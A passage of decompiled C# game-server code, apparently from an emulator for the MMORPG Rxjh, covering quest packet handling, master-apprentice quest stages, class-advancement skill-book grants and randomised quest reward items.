						}
						break;
					case 909000002:
						if (base.Player_ExpErience >= 物品数量)
						{
							result = true;
						}
						break;
					default:
					{
						物品类[] 装备栏包裹 = base.装备栏包裹;
						foreach (物品类 物品类 in 装备栏包裹)
						{
							if (物品类.Get物品ID == 物品ID && 物品类.Get物品数量 >= 物品数量)
							{
								result = true;
							}
						}
						break;
					}
					case 909000004:
						if (base.Player_Money >= 物品数量)
						{
							result = true;
						}
						break;
					case 909000005:
						if (base.Player_WuXun >= 物品数量)
						{
							result = true;
						}
						break;
					}
				}
			}
			return result;
		}

		public void 发送六转技能书(int 空位)
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			int int_ = 0;
			switch (base.Player_Job)
			{
			case 1:
				int_ = ((base.Player_Zx != 1) ? 1000000342 : 1000000336);
				break;
			case 2:
				int_ = ((base.Player_Zx != 1) ? 1000000343 : 1000000337);
				break;
			case 3:
				int_ = ((base.Player_Zx != 1) ? 1000000344 : 1000000338);
				break;
			case 4:
				int_ = ((base.Player_Zx != 1) ? 1000000345 : 1000000339);
				break;
			case 5:
				int_ = ((base.Player_Zx != 1) ? 1000000346 : 1000000340);
				break;
			case 6:
				int_ = ((base.Player_Zx != 1) ? 1000000347 : 1000000341);
				break;
			case 7:
				int_ = ((base.Player_Zx != 1) ? 1000000497 : 1000000494);
				break;
			case 8:
				int_ = 1000000567;
				break;
			case 9:
			{
				int num = 得到包裹空位(this);
				if (num == -1)
				{
					num = 35;
				}
				增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000001010), num, Buffer.GetBytes(1), new byte[56]);
				return;
			}
			case 10:
				int_ = ((base.Player_Zx != 1) ? 1000001107 : 1000001106);
				break;
			case 11:
				int_ = 1000001532;
				break;
			case 12:
				int_ = 1000001164;
				break;
			case 13:
				int_ = 1000001284;
				break;
			}
			增加物品2(bytes, Buffer.GetBytes(int_), 空位, Buffer.GetBytes(1), new byte[56]);
		}

		public void 发送七转技能书(int 空位)
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			int int_ = 0;
			switch (base.Player_Job)
			{
			case 1:
				int_ = ((base.Player_Zx != 1) ? 1000000394 : 1000000388);
				break;
			case 2:
				int_ = ((base.Player_Zx != 1) ? 1000000395 : 1000000389);
				break;
			case 3:
				int_ = ((base.Player_Zx != 1) ? 1000000396 : 1000000390);
				break;
			case 4:
				int_ = ((base.Player_Zx != 1) ? 1000000397 : 1000000391);
				break;
			case 5:
				int_ = ((base.Player_Zx != 1) ? 1000000398 : 1000000392);
				break;
			case 6:
				int_ = ((base.Player_Zx != 1) ? 1000000399 : 1000000393);
				break;
			case 7:
				int_ = ((base.Player_Zx != 1) ? 1000000498 : 1000000495);
				break;
			case 8:
				int_ = 1000000568;
				break;
			case 10:
				int_ = ((base.Player_Zx != 1) ? 1000001109 : 1000001108);
				break;
			case 11:
				int_ = 1000001533;
				break;
			case 12:
				int_ = 1000001165;
				break;
			case 13:
				int_ = 1000001286;
				break;
			}
			增加物品2(bytes, Buffer.GetBytes(int_), 空位, Buffer.GetBytes(1), new byte[56]);
		}

		public void 发送八转技能书(int 空位)
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			int int_ = 0;
			switch (base.Player_Job)
			{
			case 1:
				int_ = ((base.Player_Zx != 1) ? 1000000470 : 1000000464);
				break;
			case 2:
				int_ = ((base.Player_Zx != 1) ? 1000000471 : 1000000465);
				break;
			case 3:
				int_ = ((base.Player_Zx != 1) ? 1000000472 : 1000000466);
				break;
			case 4:
				int_ = ((base.Player_Zx != 1) ? 1000000473 : 1000000467);
				break;
			case 5:
				int_ = ((base.Player_Zx != 1) ? 1000000474 : 1000000468);
				break;
			case 6:
				int_ = ((base.Player_Zx != 1) ? 1000000475 : 1000000469);
				break;
			case 7:
				int_ = ((base.Player_Zx != 1) ? 1000000499 : 1000000496);
				break;
			case 8:
				int_ = 1000000569;
				break;
			case 9:
				int_ = 1000001013;
				break;
			case 10:
				int_ = ((base.Player_Zx != 1) ? 1000001111 : 1000001110);
				break;
			case 11:
				int_ = 1000001534;
				break;
			case 12:
				int_ = 1000001166;
				break;
			case 13:
				int_ = 1000001287;
				break;
			}
			增加物品2(bytes, Buffer.GetBytes(int_), 空位, Buffer.GetBytes(1), new byte[56]);
		}

		public void 发送九转技能书(int 空位)
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			int int_ = 0;
			switch (base.Player_Job)
			{
			case 1:
				int_ = ((base.Player_Zx != 1) ? 1000001039 : 1000001032);
				break;
			case 2:
				int_ = ((base.Player_Zx != 1) ? 1000001040 : 1000001033);
				break;
			case 3:
				int_ = ((base.Player_Zx != 1) ? 1000001041 : 1000001034);
				break;
			case 4:
				int_ = ((base.Player_Zx != 1) ? 1000001042 : 1000001035);
				break;
			case 5:
				int_ = ((base.Player_Zx != 1) ? 1000001043 : 1000001036);
				break;
			case 6:
				int_ = ((base.Player_Zx != 1) ? 1000001044 : 1000001037);
				break;
			case 7:
				int_ = ((base.Player_Zx != 1) ? 1000001045 : 1000001038);
				break;
			case 8:
				int_ = 1000001046;
				break;
			case 9:
				int_ = 1000001047;
				break;
			case 10:
				int_ = ((base.Player_Zx != 1) ? 1000001113 : 1000001112);
				break;
			case 11:
				int_ = 1000001535;
				break;
			case 12:
				int_ = 1000001167;
				break;
			case 13:
				int_ = 1000001288;
				break;
			}
			增加物品2(bytes, Buffer.GetBytes(int_), 空位, Buffer.GetBytes(1), new byte[56]);
		}

		public void 发送十转技能书()
		{
			byte[] bytes = Buffer.GetBytes(RxjhClass.GetDBItmeId());
			int int_ = 0;
			switch (base.Player_Job)
			{
			case 1:
				int_ = ((base.Player_Zx != 1) ? 1000001192 : 1000001191);
				break;
			case 2:
				int_ = ((base.Player_Zx != 1) ? 1000001194 : 1000001193);
				break;
			case 3:
				int_ = ((base.Player_Zx != 1) ? 1000001196 : 1000001195);
				break;
			case 4:
				int_ = ((base.Player_Zx != 1) ? 1000001198 : 1000001197);
				break;
			case 5:
				int_ = ((base.Player_Zx != 1) ? 1000001200 : 1000001199);
				break;
			case 6:
				int_ = ((base.Player_Zx != 1) ? 1000001202 : 1000001201);
				break;
			case 7:
				int_ = ((base.Player_Zx != 1) ? 1000001204 : 1000001203);
				break;
			case 8:
				int_ = 1000001205;
				增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000001223), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
				break;
			case 9:
				int_ = 1000001206;
				break;
			case 10:
				int_ = ((base.Player_Zx != 1) ? 1000001208 : 1000001207);
				break;
			case 11:
				int_ = 1000001209;
				break;
			case 12:
				int_ = 1000001210;
				break;
			case 13:
				int_ = 1000001289;
				break;
			}
			增加物品2(bytes, Buffer.GetBytes(int_), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
		}

		public void 新学气功(int 气功位置, int type)
		{
			if (type == 0)
			{
				if (Buffer.ToInt16(气功[气功位置].气功_byte, 0) == 255)
				{
					气功[气功位置] = new 气功类(new byte[2]);
					气功[气功位置].气功ID = 得到气功ID(气功位置, base.Player_Job);
					更新武功和状态();
				}
			}
			else
			{
				气功[气功位置] = new 气功类(new byte[2]);
				气功[气功位置].气功ID = 得到气功ID(气功位置, base.Player_Job);
				更新武功和状态();
			}
		}

		public void 奖励任务道具(Dictionary<int, 阶段奖励物品类> 奖励物品)
		{
			foreach (阶段奖励物品类 value2 in 奖励物品.Values)
			{
				switch (value2.物品ID)
				{
				case 800000002:
				{
					for (int num33 = 0; num33 < value2.物品数量; num33++)
					{
						int num34 = RNG.Next(0, 100);
						int num35;
						if (num34 >= 0 && num34 < 50)
						{
							num35 = RNG.Next(200002, 200008);
						}
						else if (num34 >= 50 && num34 < 80)
						{
							num35 = RNG.Next(1100015, 1100040);
							if (num35 % 2 != 0)
							{
								num35--;
							}
						}
						else
						{
							num35 = RNG.Next(300015, 300040);
							if (num35 % 2 != 0)
							{
								num35--;
							}
						}
						int num36 = 得到包裹空位(this);
						if (num36 == -1)
						{
							num36 = 0;
						}
						增加物品带属性(800000002, num36, 1, num35, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000001:
				{
					for (int num25 = 0; num25 < value2.物品数量; num25++)
					{
						int num26 = RNG.Next(0, 100);
						int num27;
						if (num26 >= 0 && num26 < 30)
						{
							num27 = RNG.Next(100004, 100015);
						}
						else if (num26 >= 30 && num26 < 70)
						{
							num27 = RNG.Next(700005, 700025);
						}
						else if (num26 >= 70 && num26 < 90)
						{
							num27 = RNG.Next(300015, 300040);
							if (num27 % 2 != 0)
							{
								num27--;
							}
						}
						else
						{
							num27 = 800001;
						}
						int num28 = 得到包裹空位(this);
						if (num28 == -1)
						{
							num28 = 0;
						}
						增加物品带属性(800000001, num28, 1, num27, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 909000001:
					base.人物经验 += value2.物品数量;
					计算人物基本数据3();
					更新经验和历练();
					break;
				case 909000002:
					base.Player_ExpErience += value2.物品数量;
					更新经验和历练();
					break;
				case 909000004:
					base.Player_Money += (uint)value2.物品数量;
					得到钱的提示((uint)value2.物品数量);
					更新金钱和负重();
					break;
				case 909000005:
					base.Player_WuXun += value2.物品数量;
					更新武功和状态();
					break;
				case 800000023:
				{
					for (int num29 = 0; num29 < value2.物品数量; num29++)
					{
						int num30 = RNG.Next(0, 100);
						int num31;
						if (num30 >= 0 && num30 < 30)
						{
							num31 = RNG.Next(100008, 100020);
						}
						else if (num30 >= 30 && num30 < 70)
						{
							num31 = RNG.Next(700015, 700030);
						}
						else if (num30 >= 70 && num30 < 90)
						{
							num31 = RNG.Next(300025, 300050);
							if (num31 % 2 != 0)
							{
								num31--;
							}
						}
						else
						{
							num31 = 800002;
						}
						int num32 = 得到包裹空位(this);
						if (num32 == -1)
						{
							num32 = 0;
						}
						增加物品带属性(800000023, num32, 1, num31, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000024:
				{
					for (int num21 = 0; num21 < value2.物品数量; num21++)
					{
						int num22 = RNG.Next(0, 100);
						int num23;
						if (num22 >= 0 && num22 < 50)
						{
							num23 = RNG.Next(200005, 200010);
						}
						else if (num22 >= 50 && num22 < 80)
						{
							num23 = RNG.Next(1100025, 1100080);
							if (num23 % 2 != 0)
							{
								num23--;
							}
						}
						else
						{
							num23 = RNG.Next(300025, 300050);
							if (num23 % 2 != 0)
							{
								num23--;
							}
						}
						int num24 = 得到包裹空位(this);
						if (num24 == -1)
						{
							num24 = 0;
						}
						增加物品带属性(800000024, num24, 1, num23, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000025:
				{
					for (int n = 0; n < value2.物品数量; n++)
					{
						int 物品属性5 = RNG.Next(1000010, 1000020);
						int num12 = 得到包裹空位(this);
						if (num12 == -1)
						{
							num12 = 0;
						}
						增加物品带属性(800000001, num12, 1, 物品属性5, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000026:
				{
					for (int k = 0; k < value2.物品数量; k++)
					{
						int 物品属性2 = RNG.Next(700010, 700025);
						int num7 = 得到包裹空位(this);
						if (num7 == -1)
						{
							num7 = 0;
						}
						增加物品带属性(800000001, num7, 1, 物品属性2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000028:
				{
					for (int num37 = 0; num37 < value2.物品数量; num37++)
					{
						string s2 = "200" + RNG.Next(1, 6) + "000";
						int num38 = 得到包裹空位(this);
						if (num38 == -1)
						{
							num38 = 0;
						}
						增加物品带属性(800000028, num38, 1, int.Parse(s2), 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				default:
				{
					ItmeClass value;
					if (World.Itme.TryGetValue(value2.物品ID, out value))
					{
						switch (value.FLD_PID)
						{
						case 1000000186:
						{
							int num18 = 得到包裹空位(this);
							if (num18 == -1)
							{
								num18 = 35;
							}
							增加物品带属性(value2.物品ID, num18, value2.物品数量, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 1, 0);
							break;
						}
						case 1008000003:
						case 1008000044:
						case 1008000045:
						case 1008000055:
						{
							for (int num16 = 0; num16 < value2.物品数量; num16++)
							{
								int num17 = 得到包裹空位(this);
								if (num17 == -1)
								{
									num17 = 35;
								}
								增加物品带属性(value2.物品ID, num17, 1, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 1, 0);
							}
							break;
						}
						}
						if (value.FLD_QUESTITEM == 1)
						{
							设置任务物品(value2.物品ID, value2.物品数量);
						}
						else
						{
							for (int num19 = 0; num19 < value2.物品数量; num19++)
							{
								int num20 = 得到包裹空位(this);
								if (num20 == -1)
								{
									num20 = 0;
								}
								增加物品带属性(value2.物品ID, num20, 1, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 0, 0);
							}
						}
					}
					break;
				}
				case 800000030:
				{
					for (int num13 = 0; num13 < value2.物品数量; num13++)
					{
						Random random4 = new Random();
						int num14 = random4.Next(0, 101);
						int 物品属性6 = (num14 >= 0 && num14 < 20) ? random4.Next(100005, 100016) : ((num14 >= 20 && num14 < 40) ? random4.Next(700008, 700026) : ((num14 >= 40 && num14 < 60) ? random4.Next(1000008, 1000021) : ((num14 < 60 || num14 >= 90) ? random4.Next(1500001, 1500006) : random4.Next(200001, 200016))));
						int num15 = 得到包裹空位(this);
						if (num15 == -1)
						{
							num15 = 0;
						}
						增加物品带属性(800000030, num15, 1, 物品属性6, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000031:
				{
					for (int m = 0; m < value2.物品数量; m++)
					{
						Random random3 = new Random();
						int num10 = random3.Next(0, 101);
						int 物品属性4 = (num10 >= 0 && num10 < 20) ? random3.Next(100005, 100016) : ((num10 >= 20 && num10 < 40) ? random3.Next(700008, 700026) : ((num10 >= 40 && num10 < 60) ? random3.Next(1000008, 1000021) : ((num10 < 60 || num10 >= 90) ? random3.Next(1500001, 1500006) : random3.Next(200001, 200016))));
						int num11 = 得到包裹空位(this);
						if (num11 == -1)
						{
							num11 = 0;
						}
						增加物品带属性(800000031, num11, 1, 物品属性4, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000032:
				{
					for (int l = 0; l < value2.物品数量; l++)
					{
						Random random2 = new Random();
						int num8 = random2.Next(0, 101);
						int 物品属性3 = (num8 >= 0 && num8 < 20) ? random2.Next(100005, 100016) : ((num8 >= 20 && num8 < 40) ? random2.Next(300010, 300051) : ((num8 >= 40 && num8 < 60) ? random2.Next(1000008, 1000021) : ((num8 < 60 || num8 >= 90) ? random2.Next(500010, 500021) : random2.Next(200001, 200016))));
						int num9 = 得到包裹空位(this);
						if (num9 == -1)
						{
							num9 = 0;
						}
						增加物品带属性(800000032, num9, 1, 物品属性3, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000033:
				{
					for (int j = 0; j < value2.物品数量; j++)
					{
						Random random = new Random();
						int num5 = random.Next(0, 101);
						int 物品属性 = (num5 >= 0 && num5 < 20) ? random.Next(100005, 100016) : ((num5 >= 20 && num5 < 40) ? random.Next(300010, 300051) : ((num5 >= 40 && num5 < 60) ? random.Next(1000008, 1000021) : ((num5 < 60 || num5 >= 90) ? random.Next(500010, 500021) : random.Next(200001, 200016))));
						int num6 = 得到包裹空位(this);
						if (num6 == -1)
						{
							num6 = 0;
						}
						增加物品带属性(800000033, num6, 1, 物品属性, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 800000013:
				{
					for (int i = 0; i < value2.物品数量; i++)
					{
						int num = 0;
						string str = "0000";
						int num2 = RNG.Next(0, 125);
						int num3 = (num2 >= 0 && num2 <= 40) ? 8 : ((num2 > 40 && num2 <= 70) ? 9 : ((num2 > 70 && num2 <= 90) ? 12 : ((num2 <= 90 || num2 > 110) ? 15 : 13)));
						switch (num3)
						{
						case 8:
							num = 1;
							str = "0000";
							break;
						case 9:
							num = 1;
							break;
						case 12:
							num = 10;
							break;
						case 13:
							num = 5;
							break;
						case 15:
							num = 1;
							break;
						}
						string s = (num3 != 12) ? (num3 + str + num) : (num3 + "000" + num);
						int num4 = 得到包裹空位(this);
						if (num4 == -1)
						{
							num4 = 0;
						}
						增加物品带属性(800000013, num4, 1, int.Parse(s), 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				}
				case 909000003:
					break;
				}
			}
		}

		public void 任务系统(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt16(封包数据, 10);
			int num2 = BitConverter.ToInt16(封包数据, 12);
			int num3 = BitConverter.ToInt16(封包数据, 14);
			switch (num)
			{
			case 386:
				switch (num2)
				{
				case 1:
					if (base.Player_WuXun < 65000)
					{
						任务提示数据发送(num, 12, num3);
					}
					else
					{
						任务提示数据发送(num, 11, num3);
					}
					break;
				case 2:
				{
					if (base.Player_WuXun < 65000)
					{
						任务提示数据发送(num, 12, 1);
						break;
					}
					int num4 = 得到包裹空位(this);
					if (num4 != -1)
					{
						任务提示数据发送(num, 21, 1);
						base.Player_WuXun -= 65000;
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000290), num4, BitConverter.GetBytes(1), new byte[56]);
						系统提示("获得武勋丹(50000)。");
						更新武功和状态();
						任务提示数据发送(num, 41, 0);
						RxjhClass.药品记录(base.Userid, base.UserName, 386, "武勋兑换武勋丹", 1);
					}
					else
					{
						系统提示("背包没空位了。");
						任务提示数据发送(num, 51, 0);
					}
					break;
				}
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 4:
					if (任务.ContainsKey(num))
					{
						任务.Remove(num);
					}
					任务提示数据发送(num, 41, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					break;
				}
				break;
			default:
				try
				{
					switch (num2)
					{
					case 1:
						任务提示数据发送(num, 12, num3);
						break;
					case 2:
						设置任务数据(num, num3);
						任务提示数据发送(num, 21, num3);
						break;
					case 3:
						任务提示数据发送(num, 31, num3);
						break;
					case 4:
						if (任务.ContainsKey(num))
						{
							任务.Remove(num);
						}
						任务提示数据发送(num, 41, num3);
						break;
					case 5:
						任务提示数据发送(num, 51, num3);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						break;
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(2, "MissIon" + num + "(" + base.人物全服ID + "," + num + "," + num2 + "," + num3 + ")");
					Form1.WriteLine(2, "和NPC对话--" + ex.Message);
					switch (num2)
					{
					case 2:
						break;
					case 4:
						break;
					case 1:
						任务提示数据发送(num, 11, num3);
						break;
					case 3:
						任务提示数据发送(num, 31, num3);
						break;
					case 5:
						任务提示数据发送(num, 51, num3);
						break;
					}
				}
				break;
			case 1101:
				switch (num2)
				{
				case 4:
					break;
				case 1:
					if (师傅数据.STLEVEL == 5 && 师傅数据.STYHD >= 10000)
					{
						if (num3 == 1)
						{
							设置任务数据(num, 2);
							任务提示数据发送(num, 11, 2);
						}
						else
						{
							任务提示数据发送(num, 11, num3);
						}
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 2:
					if (师傅数据.STLEVEL == 5 && 师傅数据.STYHD >= 10000)
					{
						师傅数据.STYHD = 0;
						师傅数据.STLEVEL = 4;
						徒弟更新师徒系统();
						Players players4 = World.检查玩家name(师傅数据.STNAME);
						if (players4 != null)
						{
							for (int l = 0; l < 3; l++)
							{
								if (players4.徒弟数据[l].TID == 师傅数据.TID)
								{
									players4.徒弟数据[l].STYHD = 0;
									players4.徒弟数据[l].STLEVEL = 4;
									players4.师傅更新师徒系统(l);
									break;
								}
							}
						}
						任务提示数据发送(num, 21, num3);
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				}
				break;
			case 1102:
				switch (num2)
				{
				case 4:
					break;
				case 1:
					if (师傅数据.STLEVEL == 4 && 师傅数据.STYHD >= 10000)
					{
						if (num3 == 1)
						{
							设置任务数据(num, 2);
							任务提示数据发送(num, 11, 2);
						}
						else
						{
							任务提示数据发送(num, 11, num3);
						}
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 2:
					if (师傅数据.STLEVEL == 4 && 师傅数据.STYHD >= 10000)
					{
						师傅数据.STYHD = 0;
						师傅数据.STLEVEL = 3;
						徒弟更新师徒系统();
						Players players3 = World.检查玩家name(师傅数据.STNAME);
						if (players3 != null)
						{
							for (int k = 0; k < 3; k++)
							{
								if (players3.徒弟数据[k].TID == 师傅数据.TID)
								{
									players3.徒弟数据[k].STYHD = 0;
									players3.徒弟数据[k].STLEVEL = 3;
									players3.师傅更新师徒系统(k);
									break;
								}
							}
						}
						任务提示数据发送(num, 21, num3);
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				}
				break;
			case 1103:
				switch (num2)
				{
				case 4:
					break;
				case 1:
					if (师傅数据.STLEVEL == 3 && 师傅数据.STYHD >= 10000)
					{
						if (num3 == 1)
						{
							设置任务数据(num, 2);
							任务提示数据发送(num, 11, 2);
						}
						else
						{
							任务提示数据发送(num, 11, num3);
						}
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 2:
					if (师傅数据.STLEVEL == 3 && 师傅数据.STYHD >= 10000)
					{
						师傅数据.STYHD = 0;
						师傅数据.STLEVEL = 2;
						徒弟更新师徒系统();
						Players players2 = World.检查玩家name(师傅数据.STNAME);
						if (players2 != null)
						{
							for (int j = 0; j < 3; j++)
							{
								if (players2.徒弟数据[j].TID == 师傅数据.TID)
								{
									players2.徒弟数据[j].STYHD = 0;
									players2.徒弟数据[j].STLEVEL = 2;
									players2.师傅更新师徒系统(j);
									break;
								}
							}
						}
						任务提示数据发送(num, 21, num3);
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				}
				break;
			case 1104:
				switch (num2)
				{
				case 4:
					break;
				case 1:
					if (师傅数据.STLEVEL == 2 && 师傅数据.STYHD >= 10000)
					{
						if (num3 == 1)
						{
							设置任务数据(num, 2);
							任务提示数据发送(num, 11, 2);
						}
						else
						{
							任务提示数据发送(num, 11, num3);
						}
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 2:
					if (师傅数据.STLEVEL == 2 && 师傅数据.STYHD >= 10000)
					{
						师傅数据.STYHD = 0;
						师傅数据.STLEVEL = 1;
						徒弟更新师徒系统();
						Players players = World.检查玩家name(师傅数据.STNAME);
						if (players != null)
						{
							for (int i = 0; i < 3; i++)
							{
								if (players.徒弟数据[i].TID == 师傅数据.TID)
								{
									players.徒弟数据[i].STYHD = 0;
									players.徒弟数据[i].STLEVEL = 1;
									players.师傅更新师徒系统(i);
									break;
								}
							}
						}
						任务提示数据发送(num, 21, num3);
					}
					else
					{
						任务提示数据发送(num, 12, num3);
					}
					break;
				case 3:
					任务提示数据发送(num, 31, num3);
					break;
				case 5:
					任务提示数据发送(num, 51, num3);
					break;
				}
				break;
			case 11:
			case 12:
			case 18:
			case 45:
			case 46:
			case 73:
			case 74:
			case 178:
			case 300:
			case 301:
			case 400:
			case 401:
			case 402:
			case 403:
			case 404:
			case 405:
			case 406:
			case 407:
			case 408:
			case 409:
			case 410:
			case 615:
			case 617:
			case 620:
			case 748:
			case 749:
			case 750:
			case 1002:
			case 1003:
			case 1004:
			case 1005:
			case 1006:
				try
				{
					Mission.任务(封包数据, 封包大小);
				}
				catch
				{
					Form1.WriteLine(2, "人物转职出错" + num + "(" + base.人物全服ID + "," + num + "," + num2 + "," + num3 + ")");
					switch (num2)
					{
					case 2:
						break;
					case 4:
						break;
					case 1:
						任务提示数据发送(num, 11, num3);
						break;
					case 3:
						任务提示数据发送(num, 31, num3);
						break;
					case 5:
						任务提示数据发送(num, 51, num3);
						break;
					}
				}
				break;
			}
		}

		public int Get任务阶段(int 任务ID)
		{
			任务类 value;
			if (任务.TryGetValue(任务ID, out value))
			{
				return value.任务阶段ID;
			}
			return 0;
		}

		public void 任务提示数据发送(int 任务ID, int 操作ID, int 任务阶段ID)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write2(任务ID);
				发包类.Write2(操作ID);
				发包类.Write2(任务阶段ID);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 33792, base.人物全服ID);
				}
			}
		}

		public void 得到任务物品(int 物品位置, int 物品ID, int 物品数量)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(物品位置);
				发包类.Write4(0);
				发包类.Write4(物品ID);
				发包类.Write4(物品数量);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 33280, base.人物全服ID);
				}
			}
		}

		public bool 得到任务物品(int 物品ID, int 物品数量)
		{
			int num = 0;
			while (true)
			{
				if (num < 任务物品.Length)
				{
					if (任务物品[num].物品ID == 物品ID && 任务物品[num].物品数量 >= 物品数量)
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			return true;
		}

		public void 设置任务物品(int 物品ID, int 物品数量)
		{
			bool flag = false;
			bool flag2 = false;
			for (int i = 0; i < 任务物品.Length; i++)
			{
				if (任务物品[i].物品ID == 物品ID)
				{
					flag = true;
					flag2 = true;
					if (物品数量 == 0)
					{
						得到任务物品(i, 任务物品[i].物品ID, 0);
						任务物品[i].物品_byte = new byte[8];
					}
					else
					{
						任务物品[i].物品数量 += 物品数量;
						得到任务物品(i, 任务物品[i].物品ID, 任务物品[i].物品数量);
					}
					break;
				}
			}
			if (!flag && 物品数量 > 0)
			{
				for (int j = 0; j < 任务物品.Length; j++)
				{
					if (任务物品[j].物品ID == 0)
					{
						任务物品[j].物品ID = 物品ID;
						任务物品[j].物品数量 += 物品数量;
						得到任务物品(j, 任务物品[j].物品ID, 任务物品[j].物品数量);
						flag2 = true;
						break;
					}
				}
			}
			if (!flag2)
			{
				系统提示("任务物品已满不能继续。");
			}
		}

		public void 设置任务数据(int 任务ID, int 任务阶段ID)
		{
			任务类 value;
			if (任务.TryGetValue(任务ID, out value))
			{
				value.任务阶段ID = 任务阶段ID;
				if (value.任务阶段数量 + 1 == 任务阶段ID)
				{
					switch (任务ID)
					{
					case 12:
						人物转职业(2, 2);
						if (BitConverter.ToInt16(气功[6].气功_byte, 0) == 255)
						{
							气功[6] = new 气功类(new byte[2]);
							气功[6].气功ID = 得到气功ID(6, base.Player_Job);
							气功[6].气功量 = 0;
						}
						初始化气功();
						base.Player_Money += 2000000L;
						更新武功和状态();
						break;
					case 11:
						人物转职业(1, 2);
						if (BitConverter.ToInt16(气功[6].气功_byte, 0) == 255)
						{
							气功[6] = new 气功类(new byte[2]);
							气功[6].气功ID = 得到气功ID(6, base.Player_Job);
							气功[6].气功量 = 0;
						}
						base.Player_Money += 2000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 54:
						人物转职业(base.Player_Zx, 3);
						if (BitConverter.ToInt16(气功[7].气功_byte, 0) == 255)
						{
							气功[7] = new 气功类(new byte[2]);
							气功[7].气功ID = 得到气功ID(7, base.Player_Job);
							气功[7].气功量 = 0;
						}
						base.Player_Money += 3000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 53:
						人物转职业(base.Player_Zx, 3);
						if (BitConverter.ToInt16(气功[7].气功_byte, 0) == 255)
						{
							气功[7] = new 气功类(new byte[2]);
							气功[7].气功ID = 得到气功ID(7, base.Player_Job);
							气功[7].气功量 = 0;
						}
						base.Player_Money += 3000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 18:
						人物转职业(0, 1);
						if (BitConverter.ToInt16(气功[5].气功_byte, 0) == 255)
						{
							气功[5] = new 气功类(new byte[2]);
							气功[5].气功ID = 得到气功ID(5, base.Player_Job);
							气功[5].气功量 = 0;
						}
						初始化气功();
						更新武功和状态();
						break;
					case 131:
						if (BitConverter.ToInt16(气功[9].气功_byte, 0) == 255)
						{
							气功[9] = new 气功类(new byte[2]);
							气功[9].气功ID = 得到气功ID(9, base.Player_Job);
							气功[9].气功量 = 0;
						}
						初始化气功();
						更新武功和状态();
						break;
					case 82:
						人物转职业(base.Player_Zx, 4);
						if (BitConverter.ToInt16(气功[8].气功_byte, 0) == 255)
						{
							气功[8] = new 气功类(new byte[2]);
							气功[8].气功ID = 得到气功ID(8, base.Player_Job);
							气功[8].气功量 = 0;
						}
						初始化气功();
						更新武功和状态();
						break;
					case 81:
						人物转职业(base.Player_Zx, 4);
						if (BitConverter.ToInt16(气功[8].气功_byte, 0) == 255)
						{
							气功[8] = new 气功类(new byte[2]);
							气功[8].气功ID = 得到气功ID(8, base.Player_Job);
							气功[8].气功量 = 0;
						}
						初始化气功();
						更新武功和状态();
						break;
					case 1101:
						徒弟更新师徒系统();
						break;
					case 1102:
						徒弟更新师徒系统();
						break;
					case 1103:
						徒弟更新师徒系统();
						break;
					case 1104:
						徒弟更新师徒系统();
						break;
					case 1002:
						灵兽转职业(0, 1);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
